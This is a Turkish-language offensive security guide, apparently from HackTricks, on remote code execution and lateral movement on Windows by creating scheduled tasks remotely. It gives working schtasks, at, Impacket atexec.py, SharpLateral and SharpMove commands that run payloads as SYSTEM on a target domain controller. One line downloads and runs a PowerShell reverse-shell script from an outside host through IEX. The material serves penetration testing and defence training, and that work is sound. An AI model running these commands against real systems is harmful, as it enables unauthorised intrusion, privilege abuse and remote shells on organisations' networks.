# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Nasıl çalışır

Bir Windows hostuna administrative access ile bir operator, uzaktan scheduled task oluşturup başlatabilir. `/S` seçeneği remote hostu seçer, `/U` ve `/P` gerektiğinde task oluşturmak için kimlik bilgilerini sağlar ve `/RU`, taskın altında çalışacağı hesabı seçer. `/TR` tarafından referans verilen command remote system üzerinde mevcut olmalıdır.<sup>[[1]](#references)</sup>

Daha eski `at` command'i, Schedule service çalışırken remote host üzerinde de bir command schedule edebilir. Scheduled job'ları service account altında çalıştırır; bu hesap genellikle `SYSTEM`'dır:<sup>[[5]](#references)</sup>
```cmd
at \\victim 23:00 shutdown -r
```
Görevi oluşturun ve ardından başlatın:
```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```
Örneğin:
```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Yinelenen haftalık bir görev için geçerli bir haftalık zamanlama kullanın ve günü açıkça belirtin:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```
Bir görev eylemi PowerShell'i doğrudan da çalıştırabilir. Aşağıdaki lab örneği bir script indirip çalıştırır; payload'u yalnızca assessment için yetkilendirilmiş altyapıda barındırın:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Impacket'in `atexec.py` aracı, Task Scheduler service üzerinden uzaktan komut çalıştırmayı otomatikleştirir ve parola, NTLM-hash veya Kerberos authentication kabul eder.<sup>[[2]](#references)</sup>
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
SharpLateral bir scheduled-task execution yöntemi sağlar:<sup>[[3]](#references)</sup>
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
SharpMove başka bir Task Scheduler implementasyonu sunar:<sup>[[4]](#references)</sup>
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
[**schtasks'ın silver tickets ile kullanımı hakkında daha fazla bilgi için buraya bakın**](../active-directory-methodology/silver-ticket.md#host).

Kullanımdan sonra test görevlerini kaldırın:
```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```
## References

- [1] [Microsoft Learn - schtasks create](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - `at` komutu](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
